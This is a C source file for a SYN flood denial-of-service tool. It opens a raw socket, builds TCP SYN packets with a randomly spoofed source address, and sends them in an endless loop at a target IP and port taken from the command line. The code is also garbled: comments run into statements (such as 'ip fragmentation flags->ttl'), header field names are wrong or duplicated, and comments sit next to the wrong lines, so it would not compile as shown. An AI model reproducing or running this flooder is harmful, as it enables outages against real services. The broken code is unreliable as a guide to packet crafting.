#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define PACKET_LEN sizeof(struct iphdr) + sizeof(struct tcphdr)

/*
Imagine that you are sending a letter by mail. To make sure that no one spoils it along the way, you write in the corner:
"There are exactly 1000 characters in this letter."

If the postman delivers a letter and it contains 999 characters, it means that something is lost.
In code:
ip->check = 0;  // Reset to zero before calculating
ip->check = csum((unsigned short*)ip, sizeof(struct iphdr)); // Counting the amount for the IP
tcp->check = csum((unsigned short*)tcp, sizeof(struct tcphdr)); // And for the TCP
*/
// Define packet size as the sum of IP and TCP header sizes.   
unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while(len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if(len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Function for cakcukating the checksum of IP and TCP packets;
void syn_flood(const char* target_ip, int target_port) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        perror("socket");
        exit(1);
    }
    
    // create a raw socket to send packets directly;
    char packet[PACKET_LEN];
    memset(packet, 0, PACKET_LEN);
    
    struct iphdr *ip = (struct iphdr*)packet;
    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    // Prepare a buffer for packet and pointers to IP and TCP headers;
    // Filling in the IP header
    ip->ihl = 5;
    ip->version = 4;  // IPv4
    ip->tos = 0;      // Type of Service
    ip->tot_len = htons(PACKET_LEN); // Packet length
    ip->id = htons(rand()); // Package ID
    ip->frag_off = 0; //
    ip fragmentation flags->ttl = 255; // Time To Live
    ip->protocol = IPPROTO_TCP; // Top-level protocol
    ip->check = 0; // Checksum (so far 0)
    ip->addr = htonl(rand()); // Source IP spoofing
    ip->addr = inet_addr(target_ip); // Target IP
    
    // Filling in the TCP header
    tcp->source =htons(rand() % 65535); // Random sender port
    tcp->dest =htons(target_port); // Target port
    tcp->seq = htonl(rand()); // Sequence number
    tcp->ack_seq = 0; // TCP confirmation
    number->doff = 5; // TCP header length
    tcp->syn = 1; // Setting the SYN flag
    tcp->window =htons(5840); //
    tcp window size->check = 0; // Checksum (so far 0)
    tcp->arg_ptr = 0; // Urgency indicator
    
    // Calculation of checksums
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = tcp->dest;
    dest.sin_addr.s_addr = ip->daddr;
    
    tcp->check = csum((unsigned short*)tcp, sizeof(struct tcphdr));
    ip->check = csum((unsigned short*)ip, sizeof(struct iphdr));
    
    // Send packets
    while(1) {
        if(sendto(s, packet, PACKET_LEN, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("sendto");
            break;
        }
        printf("SYN packet sent to %s:%d\n", target_ip, target_port);
        usleep(10000); // Задержка для снижения нагрузки на CPU
    }
    
    close(s);
}

int main(int argc, char *argv[]) {
    if(argc != 3) {
        printf("Usage: %s <target IP> <target port>\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    syn_flood(argv[1], atoi(argv[2]));
    return 0;
}